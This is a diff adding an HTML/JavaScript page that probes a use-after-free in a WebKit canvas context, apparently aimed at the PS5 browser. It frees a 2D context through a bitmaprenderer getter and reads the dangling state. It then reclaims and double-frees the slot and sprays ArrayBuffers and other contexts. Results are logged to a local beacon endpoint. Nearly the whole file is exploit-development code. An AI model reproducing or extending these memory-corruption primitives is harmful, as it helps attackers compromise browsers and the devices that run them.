@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V539</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V539 — Non-virtual state reads on freed canvas context
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V539-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// T1: Read lineWidth on freed memory (NO save, NO spray, NO GC)
+// This tests whether lineWidth getter is non-virtual on PS5 binary
+setTimeout(function(){
+  try{
+    B('T1-START','lineWidth read on freed memory');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() {
+        inner = c.getContext('2d');
+        // Set distinctive values WHILE context is alive (inside getter)
+        inner.lineWidth = 12345.678;
+        inner.globalAlpha = 0.777;
+        inner.miterLimit = 98765.432;
+        inner.shadowBlur = 42.5;
+        inner.shadowOffsetX = 111.25;
+        inner.shadowOffsetY = 222.75;
+        inner.lineDashOffset = 333.125;
+        return true;
+      }
+    });
+    c.getContext('bitmaprenderer', s);
+    // Context is now freed. inner is dangling.
+    if (!inner) { B('T1-FAIL','no inner'); return; }
+    B('T1-UAF','context freed, attempting reads...');
+
+    // Test each getter individually to find which crash and which survive
+    // CRITICAL: lineWidth first — if this crashes, page dies
+    try {
+      var lw = inner.lineWidth;
+      B('T1-LW','lineWidth='+lw+' (expect 12345.678)');
+    } catch(e) { B('T1-LW-ERR',''+e); }
+
+    try {
+      var ga = inner.globalAlpha;
+      B('T1-GA','globalAlpha='+ga+' (expect 0.777)');
+    } catch(e) { B('T1-GA-ERR',''+e); }
+
+    try {
+      var ml = inner.miterLimit;
+      B('T1-ML','miterLimit='+ml+' (expect 98765.432)');
+    } catch(e) { B('T1-ML-ERR',''+e); }
+
+    try {
+      var sb = inner.shadowBlur;
+      B('T1-SB','shadowBlur='+sb+' (expect 42.5)');
+    } catch(e) { B('T1-SB-ERR',''+e); }
+
+    try {
+      var sox = inner.shadowOffsetX;
+      B('T1-SOX','shadowOffsetX='+sox+' (expect 111.25)');
+    } catch(e) { B('T1-SOX-ERR',''+e); }
+
+    try {
+      var soy = inner.shadowOffsetY;
+      B('T1-SOY','shadowOffsetY='+soy+' (expect 222.75)');
+    } catch(e) { B('T1-SOY-ERR',''+e); }
+
+    try {
+      var ldo = inner.lineDashOffset;
+      B('T1-LDO','lineDashOffset='+ldo+' (expect 333.125)');
+    } catch(e) { B('T1-LDO-ERR',''+e); }
+
+    // getTransform — reads 6 doubles from state
+    try {
+      var t = inner.getTransform();
+      B('T1-TF','transform a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    } catch(e) { B('T1-TF-ERR',''+e); }
+
+    // imageSmoothingEnabled — bool from state
+    try {
+      var ise = inner.imageSmoothingEnabled;
+      B('T1-ISE','imageSmoothingEnabled='+ise);
+    } catch(e) { B('T1-ISE-ERR',''+e); }
+
+    // textAlign, textBaseline — enum reads
+    try {
+      var ta = inner.textAlign;
+      B('T1-TA','textAlign='+ta);
+    } catch(e) { B('T1-TA-ERR',''+e); }
+
+    try {
+      var tb = inner.textBaseline;
+      B('T1-TB','textBaseline='+tb);
+    } catch(e) { B('T1-TB-ERR',''+e); }
+
+    // globalCompositeOperation
+    try {
+      var gco = inner.globalCompositeOperation;
+      B('T1-GCO','globalCompositeOperation='+gco);
+    } catch(e) { B('T1-GCO-ERR',''+e); }
+
+    // fillStyle — reads CanvasStyle variant, might crash on bad variant index
+    try {
+      var fs = inner.fillStyle;
+      B('T1-FS','fillStyle='+fs+' type='+typeof fs);
+    } catch(e) { B('T1-FS-ERR',''+e); }
+
+    // strokeStyle
+    try {
+      var ss = inner.strokeStyle;
+      B('T1-SS','strokeStyle='+ss+' type='+typeof ss);
+    } catch(e) { B('T1-SS-ERR',''+e); }
+
+    // shadowColor
+    try {
+      var sc = inner.shadowColor;
+      B('T1-SC','shadowColor='+sc);
+    } catch(e) { B('T1-SC-ERR',''+e); }
+
+    B('T1-DONE','all reads attempted');
+    window._inner = inner;
+    window._canvas = c;
+
+  } catch(e) { B('T1-ERR',''+e); }
+}, 200);
+
+// T2: If T1 survived, try save() on freed memory
+setTimeout(function(){
+  try{
+    if (!window._inner) { B('T2-SKIP','T1 failed'); return; }
+    B('T2-START','save() on freed memory');
+
+    // save() in WK-1400 source: ++m_unrealizedSaveCount (non-virtual)
+    // PS5 binary might differ — Sony may add drawingContext() check
+    try {
+      window._inner.save();
+      B('T2-SAVE','save() OK on freed memory');
+    } catch(e) { B('T2-SAVE-ERR',''+e); }
+
+    // If save() survived, can we still read?
+    try {
+      var lw = window._inner.lineWidth;
+      B('T2-LW-AFTER','lineWidth='+lw+' after save');
+    } catch(e) { B('T2-LW-AFTER-ERR',''+e); }
+
+  } catch(e) { B('T2-ERR',''+e); }
+}, 2000);
+
+// T3: Reclaim freed slot with same-type, then re-free + read
+// Tests: lineWidth read after free of RECLAIMED context
+setTimeout(function(){
+  try{
+    B('T3-START','double free + read');
+    // Fresh UAF
+    var c3 = document.createElement('canvas');
+    c3.width = 1; c3.height = 1;
+    var dang3 = null;
+    var s3 = {};
+    Object.defineProperty(s3, 'alpha', {
+      get: function() {
+        dang3 = c3.getContext('2d');
+        dang3.lineWidth = 55555.5;
+        return true;
+      }
+    });
+    c3.getContext('bitmaprenderer', s3);
+    if (!dang3) { B('T3-FAIL','no dang'); return; }
+
+    // Same-type reclaim
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 600 + i;
+      ctxs.push({canvas: nc, ctx: nctx});
+    }
+
+    var dlw = dang3.lineWidth;
+    if (dlw < 600 || dlw >= 800) {
+      B('T3-NO-ALIAS','lw='+dlw);
+      return;
+    }
+    var aidx = dlw - 600;
+    B('T3-ALIAS','aliased at #'+aidx);
+
+    // Now free the aliased context (second bitmaprenderer)
+    var s3b = {};
+    Object.defineProperty(s3b, 'alpha', { get: function() { return true; } });
+    ctxs[aidx].canvas.getContext('bitmaprenderer', s3b);
+    B('T3-FREED','aliased context freed');
+
+    // NOW: dang3 points to freed memory (second free)
+    // The freed memory has VALID canvas2d data (from the reclaiming context)
+    // Try to read lineWidth
+    try {
+      var lw3 = dang3.lineWidth;
+      B('T3-READ','lineWidth='+lw3+' on doubly-freed memory');
+    } catch(e) { B('T3-READ-ERR',''+e); }
+
+    // Try globalAlpha
+    try {
+      var ga3 = dang3.globalAlpha;
+      B('T3-GA','globalAlpha='+ga3);
+    } catch(e) { B('T3-GA-ERR',''+e); }
+
+    // Try getTransform
+    try {
+      var t3 = dang3.getTransform();
+      B('T3-TF','transform a='+t3.a+' d='+t3.d);
+    } catch(e) { B('T3-TF-ERR',''+e); }
+
+    window._dang3 = dang3;
+    window._ctxs3 = ctxs;
+    window._aidx3 = aidx;
+
+  } catch(e) { B('T3-ERR',''+e); }
+}, 4000);
+
+// T4: After T3 freed, spray ABs and try to read through dangling
+setTimeout(function(){
+  try{
+    if (!window._dang3) { B('T4-SKIP','no dang3'); return; }
+    B('T4-START','AB reclaim + read attempt');
+
+    // Spray 768B ABs
+    var abs = [];
+    for (var i = 0; i < 500; i++) {
+      var ab = new ArrayBuffer(768);
+      var dv = new DataView(ab);
+      // Write distinctive pattern: each 8B has offset as float64
+      for (var j = 0; j < 768; j += 8) {
+        dv.setFloat64(j, 77000 + j, true); // little-endian
+      }
+      abs.push({ab: ab, dv: dv});
+    }
+    B('T4-SPRAYED','500 ABs with offset markers');
+
+    // Try to read lineWidth through dangling
+    // If AB reclaimed the slot, m_buffer at its offset is our pattern value
+    // state() dereferences m_buffer → will crash if m_buffer isn't valid address
+    try {
+      var lw4 = window._dang3.lineWidth;
+      B('T4-LW','lineWidth='+lw4+' (AB reclaim test)');
+    } catch(e) { B('T4-LW-ERR',''+e); }
+
+    // If that crashed, try globalAlpha
+    try {
+      var ga4 = window._dang3.globalAlpha;
+      B('T4-GA','globalAlpha='+ga4);
+    } catch(e) { B('T4-GA-ERR',''+e); }
+
+    window._abs4 = abs;
+  } catch(e) { B('T4-ERR',''+e); }
+}, 7000);
+
+// T5: Alternative — use ImageBitmapRenderingContext to reclaim
+// It may have a valid pointer at the m_buffer offset
+setTimeout(function(){
+  try{
+    B('T5-START','cross-type reclaim with IBRC');
+    // Fresh UAF
+    var c5 = document.createElement('canvas');
+    c5.width = 1; c5.height = 1;
+    var dang5 = null;
+    var s5 = {};
+    Object.defineProperty(s5, 'alpha', {
+      get: function() {
+        dang5 = c5.getContext('2d');
+        dang5.lineWidth = 88888.8;
+        return true;
+      }
+    });
+    c5.getContext('bitmaprenderer', s5);
+    if (!dang5) { B('T5-FAIL','no dang'); return; }
+
+    // lineWidth read on freed memory BEFORE any reclaim
+    try {
+      var lw5a = dang5.lineWidth;
+      B('T5-BEFORE','lineWidth='+lw5a+' (before reclaim)');
+    } catch(e) { B('T5-BEFORE-ERR',''+e); return; }
+
+    // Now spray ImageBitmapRenderingContext objects
+    // These are in a different C++ class but might be same size class
+    var ibrcCtxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      try {
+        var ibrc = nc.getContext('bitmaprenderer');
+        ibrcCtxs.push({canvas: nc, ctx: ibrc});
+      } catch(e) {}
+    }
+    B('T5-IBRC','sprayed '+ibrcCtxs.length+' IBRCs');
+
+    // Try lineWidth again — if IBRC reclaimed the slot,
+    // the data at lineWidth offset comes from IBRC's layout
+    try {
+      var lw5b = dang5.lineWidth;
+      B('T5-AFTER-IBRC','lineWidth='+lw5b+' (after IBRC spray)');
+    } catch(e) { B('T5-AFTER-IBRC-ERR',''+e); }
+
+    // Try other reads
+    try {
+      var ga5 = dang5.globalAlpha;
+      B('T5-GA','globalAlpha='+ga5);
+    } catch(e) { B('T5-GA-ERR',''+e); }
+
+  } catch(e) { B('T5-ERR',''+e); }
+}, 10000);
+
+// T6: Test what happens with stateStack grown BEFORE free
+// If stateStack was heap-allocated (save+realize), m_buffer points to HEAP
+// After free, m_buffer still points to separate heap allocation
+// That heap allocation is NOT freed yet (stateStack buffer is freed WITH context)
+// Actually it IS freed: context destructor destroys Vector which frees buffer
+setTimeout(function(){
+  try{
+    B('T6-START','stateStack growth before free');
+    var c6 = document.createElement('canvas');
+    c6.width = 1; c6.height = 1;
+    var dang6 = null;
+    var s6 = {};
+    Object.defineProperty(s6, 'alpha', {
+      get: function() {
+        dang6 = c6.getContext('2d');
+        // Grow stateStack INSIDE getter (context alive)
+        for (var i = 0; i < 16; i++) {
+          dang6.save();
+          dang6.lineWidth = 40000 + i;
+        }
+        // Force realize by reading (triggers realizeSavesLoop → drawingContext)
+        // Actually this might crash if drawingContext fails inside getter...
+        // Let's try — we're INSIDE the getter, context should be alive
+        var _lw = dang6.lineWidth;
+        dang6.globalAlpha = 0.99;
+        return true;
+      }
+    });
+    c6.getContext('bitmaprenderer', s6);
+    if (!dang6) { B('T6-FAIL','no dang'); return; }
+    B('T6-UAF','stateStack grown + freed');
+
+    // m_stateStack.m_buffer was pointing to HEAP buffer (not inline)
+    // After free, both context and heap buffer are freed
+    // But m_buffer still has the old heap address
+    // If nothing reclaimed the heap buffer, it's still mapped with old data
+    try {
+      var lw6 = dang6.lineWidth;
+      B('T6-READ','lineWidth='+lw6+' (heap stateStack, both freed)');
+    } catch(e) { B('T6-READ-ERR',''+e); }
+
+    try {
+      var ga6 = dang6.globalAlpha;
+      B('T6-GA','globalAlpha='+ga6);
+    } catch(e) { B('T6-GA-ERR',''+e); }
+
+  } catch(e) { B('T6-ERR',''+e); }
+}, 13000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},17000);
+</script></body></html>
